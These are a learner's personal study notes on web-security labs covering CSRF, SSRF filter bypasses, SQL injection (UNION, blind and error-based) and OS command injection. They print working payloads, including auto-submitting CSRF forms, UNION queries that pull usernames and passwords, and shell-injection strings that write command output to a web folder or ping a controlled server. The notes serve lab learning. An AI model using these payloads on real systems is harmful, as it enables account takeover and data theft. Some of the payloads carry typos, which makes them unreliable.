  

- okay so the lab was asking me to send
    
    a request and ( exploit a csrf ) vulenrability so what i did was crafting a HTML payload that recalls the path of the /changeemail functionality and then it contains another input field (hidden) that is used to send the data of the new email i am forcing the victim to put as a value so at the end the victim visits the link i send him it opens the
    
    < form that contains the src of the /changeemail >
    
    <input type=hidden that send the information i want to send as if i am the real user>
    
    !!! of course the format , syntax here is not that good but the real thing i used was
    
    ```
    <html>
        <body>
            <form action="https://vulnerable-website.com/email/change" method="POST">
                <input type="hidden" name="email" value="pwned@evil-user.net" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
    ```
    
    but of course with a little bit of modifications the email value changed to ahmed@gmail.com
    
    and also the place of vulenrable-website .com was also changed
    
    and also the method is changed to GET and here was the vuleneragbility as the website is not checking for the CSRF for the user who is trying to do the change email unless if the request method is post so in the get method we were able to send the request without any protection .
    
      
    
    ---
    
    Okay so now lets get into the new CSRF lab the lab was talking about that sometimes the developer use only one 1 csrf token and make it global for all users and dont connect it with the session id of any user so it is a good opurtunity for us to attack it with csrf but we found after trying to attack for a while that the csrf token is always being wrong so i tried to put it in the burp repeater and then try to attack it repetedly without any modification just to test if the value of csrf will not be valid after 1 usage and yep it is really not valid after 1 usage so i went to my ligetment account and made a request and then intercepted it so it didnot go to the server and stayed valid so i used it in my maliciouse other request that will take the 2 parameters 1. global valid CSRF 2.the new email that we want to put for the victum which is our own email and by that we will be able to do anything that the user can do but for him without his permission to be him .
    
    the maliciouse html i used was
    
    ```
    <html> 
    	<body> 
    	<form action=""   method="" >
      <input name="csrf" value="RRB0gGSo6Zc493MDbss8teleLVmZiYb2(forexample)" />
      <input name="email" value="you-are@hacked.haha" />
      </form>
    	<body>
    <script>//to submit the form                                                                                                                                                                                                                                                                                                                           
    document.forms[0].submit();
    //we use document on the form and but zero  and then call submit function 
    </script>
    </html>
    ```





---
# circumventing common SSRF defenses
- it is common  to see applications containing ssrf behavior togethre with defenses aimed at preventing malicious exploitation 
## 1. first type of defense that we will circumvent 
 - some applications may block  any input containing hostnames like 127.0.0.1 and also "localhost" or sensitive urls like /admin .
 - to bypass that we will use an alternative IP representation of the local host 
	 - 127.0.0.1  we will use -> `127.1 `          or   `2130706433`  or `017700000001` 
 - for the sensitive urls that are blocked we may  obfuscate blocked strings using url encoding  or case variation  
 - sometimes also switching from http to https may sometimes bypass some anit-ssrf filters  so  try it when you try to go to a /admin  or whatever you are aiming to 
 - if 1 url encoding for sensitive blocked url is not working then try double  or triple 
 - `%68%74%74%70%3a%2f%2f%4c%6f%63%61%4c%48%6f%73%54%2f%41%64%6d%49%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73%20`
	this payload is just  a url coded version of http://LocaLHosT/AdmIn/delete?username=carlos    and this i use in here `stockApi=%68%74%74%70%3a%2f%2f%4c%6f%63%61%4c%48%6f%73%54%2f%41%64%6d%49%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73%20` 
	to delete Carlos from users by SSRF vulnerability 

okay and when i tried it i found that for it to work i can just put it without any URL encoding and then use capitalization instead 
## 2. SSRF with whitelist-based input filters
- some applications  only allow inputs that match a whitelist of permitted values .
- the filter maybe looking for a white listed value in the beginning of the input .
- even maybe the filter looks for the white listed value in the whole  URL in any place on it  but just make it present. 
- The URL specification contains a number of features that are likely  to be overlooked . 
- those features that the URL specification allows us to do  they are great place for hacking even as we saw in black hat event they did use URL specification only via a space to get into `RCE` in the system . 
- so lets see 3 of the futures that we  have in the URL specification . 
	### 1. credintials@www.google.com 
	- this is the first way which is by using `@`  
	- the credentials before the `@`  .
	- so if we said for example that the white list that is allowed in the credentials  is the user name to be admin what ever the password is  so parser will just check for   
	## 2. <http://www.google.com#urlFragment>
	- we can use the hash sign to enter an additional url fragment in the url so we can use it to add something that the parser of the url is looking for so if the parser is looking for admin-host then we can add it in the url as an additional fragment .
	## 3. http://localhost.our-host/admin
	- for example this here is  the dot way which we can use to make our-host as if it is a part of the local host which the parser is looking for localhost  so we make our self if we are a part of it . 
## 3. Bypassing SSRF  filters via open redirection 
- it is sometimes possible to bypass filter-based defenses by exploiting an open redirection vulnerability . 
- we will try to Hunt today at 9 pm using the knowledge we got tell now in ssrf  

# SQLI 
we are going to talk about sqli  
![[Pasted image 20231105153652.png]]
we just use the parameters value that have a connection with the data base  so we play in this value to close the quotations and then  import another command in there in the query language of sql .


## How to detect  sqli vulnerabilities : 
- insert ' and look for errors or other anomalies . 
- some times we use true ( OR 1=1    which is true )   (OR 1=2 which is false ) we can also use them sometimes 
- also payloads used to to trigger time delays when executed  within sql query , and look for different time taken 
- [[payloads fro sqli ]]
- 


# second-order sqli 

![[Pasted image 20231105163733.png]]

[[SQL injection cheat sheet]]


You can query the version details for the database. Different methods work for different database types. This means that if you find a particular method that works, you can infer the database type. For example, on Oracle you can execute:

`SELECT * FROM v$version`

You can also identify what database tables exist, and the columns they contain. For example, on most databases you can execute the following query to list the tables:

`SELECT * FROM information_schema.tables`

## SQL injection in different contexts
## Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:

|   |   |
|---|---|
|Database type|Query|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

For example, you could use a `UNION` attack with the following input:

`' UNION SELECT @@version--`

This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393`



## information_schema 
this set of views that is called information_schema  provides information about the database.
- except  **ORACLE** 

## The SQL SELECT Statement

The `SELECT` statement is used to select data from a database.

### Example[Get your own SQL Server](https://www.w3schools.com/sql/sql_server.asp "W3Schools Spaces")

Return data from the Customers table:

SELECT CustomerName, City FROM Customers;

---

## Syntax

`SELECT _column1_, _column2, ..._   FROM _table_name_;`

Here, column1, column2, ... are the _field names_ of the table you want to select data from.

The table_name represents the name of the _table_ you want to select data from.

---
[[info]]

---

we are going to talk about  sql and continue with a new lab in the same vulenrability here .
the lab contains a sqli vulenerability in the  product catagory as usual 
lets get the username of administrator and password of it i mean the pass only because we have the u.name ( administrator )



# How to select  data from ORACLE dbms 
note : that we said that all dbms contains    information_schema  while  in our  ORacle dbms it dont contain the  information_schema but it contains : 
	all_tables  --> which simialr to information_schema.tables . 
	and then to choose a column in a  specific  table  : 
		all_tab_columns ---> similar to inforamtion_schema.columns 
		select column_name from all_tab_columns where table_name = 'targeted_table'

okay so in the solution we got the 
table_name = 'APP_USERS_AND_ROLES'
[[columns ]]

# Lab 7 : how to know number of columns in sql dbms
'+union+select+null,null--
continue adding null or use '1' till the error msg disapears

# Lab 8 : how to find a column that contains a text 
it was just about  
1. knowing the number of columns using the null way 
2. making one of the columns that we gave null value   and it usually appears in the website  ( the column not the null value ) make that column contain a value that the lab told us to make one of the columns contain and that is it 
 `'+union+select+'1','SCeCzN','1'--`
# Lab 9 :  How to retrieve  data from other tables 

it was about : 
1. getting number of columns using null way 
2. checking which column appears using '1' instead of null 
3. and by the information provided by the lab they told me  we have table  users contains columns username and password  so we made this  payload  and retrieved the information we wanted 
`'union select username , password from users-- -`

# Lab 10 : How to retrieve multiple values in a single column 
we will concatenate the first columns value with the seconds columns value  ( note : that we are talking about the columns that we are trying to fetch and display in our only one column that the website allows us to display values on  so instead of displaying each of the columns value on each own  we will concatenate the values and we will put a sign between them  like ':' or '~')  so to do the concatenate in  quary language we use |||| between the things we want to concatenate together  and concatenate means combine . 
if we wanted to add any thing to be printed between them  we just do this  if we want to print  ':' between the two values  we will make it like this 
`username||':'||password`

know that each of username and password are columns that contain's alot of values in them  but by this way  they will appear in one  column  only   with ':' sign between them 

so how did i solve the lab :
1. knew the columns number with null method 
2. check for what columns are displayed -> only one 
3. concatenated the username , password columns from users table to appear in that one column with : between them . 
`'union select null, username||':||password from users-- - `


# we are going to learn **Blind SQL injection**
[[Blind sqli]]




# Lab 11 : Blind Sqli with conditional responses 
- We can say that all the lab i solved  in the page called [[Blind sqli]]


# Lab 12 : Blind SQli with conditional errors 
the  last  lab was also a  blind lab but the main difference between the two labs is mainly the attack used  with both we have the same target and prosidure  so how to  get the Adminstrator's password  ? 
we are going to use the  conditional errors  but what does this mean ? 
the HINT is saying that the target of the database is ORACLE 


I USED THIS PAYLOAD TILL NOW `TrackingId=xyz'||(select NULL from dual)||';`



lets play with that payload  alot :O 
- the Error blind sql injection  that we depend on to get to an information that we use while we are trying attacking .
- this is called (Error-based sqli )  which is based on the error . 
- we use errors to extract information ( sensitive  data from database) 
- as i am thinking we are going to extract data by true or false ( boolean method) and if the character is wrong we will get the error  end-server error  which will make us able to detect the whole password  of administrator the exact way of the last  lab  so  i think there will be a little bit of new method here lets see .. 
- he is saying that our condition is not going to work because the response dont depend on the   other condition we put  but how ?    will we get  the password ? 
- they are saying that we need to learn  how to force the server's database to return an error so we do that by 
          	`cooke_token' AND select case when (1=2`false`) then 1/0 else 'a' end)='a `


this input use the `case`  keyword to test for a condition 
and also returns a different  expression  whether the expression is  true or false 
in our payload  
	`cookie_token' and  select case when (1=2) then 1/0 else 'a' end`


`cookie_token' and select case when 1=2 then 1/0 else 'a' end 
`
- so this will send a result in  'a'  getting come back if the there is information returned in the response . 

so if we used another `case when `  that works in a weird  way that is similar to if  and this is a weird thing but anyways 
payload -> `cookie_token' and select case when  1=1 then 1/0 else 'a' end`
this will result into a divide by zero error because we got passed by the true and got to exploit the  1/0  which is after the then  as the case is true . 

`cookie_token' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

if `(Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm')` is true 
then we will get **divided by zero error**  which will mean that this character is really in the password . 





# I am going to play  with OS  command injection 
lets go  : 
![[Pasted image 20231123211658.png]]
- from the os command injection we can have full control on the system . 
- os command injection is also known as shell injection 
- allows the hacker to execute commands on the server that is hosting the application .
-  in the first lab : 
### they used the link in the paramter  /stockstatus?productid=234
 they used parameter ( productid) they used the command called  
 `&whoami&`
 so that this whoami will get executed without  making problems with the rest of the commands preinstalled in the application . 
the & character is a shell command separator . 
 `uname -a` gets the operating system  in linux 
 `ver` gets the  operating system in windows 

---
network connections in linux    `netstat -an` 
network connections in windows  `netstat -an `

network configurations  in linux `ifconfig` 
network configurations in  windows `ifconfig /all` 

running processes in linux  `ps -ef`
running processes in windows  `tasklist`

---
## Blind OS command injection vulnerabilities 
- no response is  comming back as answer for the request . 
- ( which means that there is no output for the command )
- as an example a feedback place ( we enter the details of the feedback and  also the mail ) in the mail parameter we  may use the delay  techniques 
- {time delays 
	`& ping -c $amount_of_time_that_i_want_to_delay localhost &
	this command cause the server to  use the ping command but with a delay and that is caused by the `-c`
we can use also another method that  requires some extra conditions : 
if we know a place in the page that we already have access to and  that place the website fetches some data from it  then  if the data is fetched from a folder  called static  then we can  then  -> ask for the command whoami in the blind request but then  we will redirect the output of that command  in a file that we will create  in the static folder as we know its path so the command is 
`& whoami > /var/www/static/whoami.txt &`

we can also use another way : 
we can  do out-of-band (OAST) techniques : 

we will inject a command that will trigger an out of band network interaction with a system that we control already  and then in our own system that we  are able to monitor we will check if the connection happened   ( if there is an ip that already tried to ping on our server that we have under our control  ) 
we will use `& nslookup ourserver.com &`

---
# Vulnerabilities as a table 


| Name                                    |
| --------------------------------------- |
| [[path traversal]]                      |
| [[CSRF]]                                |
| [[WebSockets]]                          |
| [[File Upload vulnerabilities]]         |
| [[Reflected XSS]]                       |
| [[Html Request Smuggling]]              |
| [[Authentication vulnerabilities]]      |
| [[Web Cache Poisoning ]]                |
| [[Click Jacking]]                       |
| [[Race Condition]]                      |
| [[Information disclosure]]              |
| [[JWT]]                                 |
| [[Server Side Template Injection ssti]] |
| [[access control ]]                     |
| [[DOM-based vulnerabilities]]           |
| [[GraphQL API vulns]]                   |
|         [[CORS]]                                |
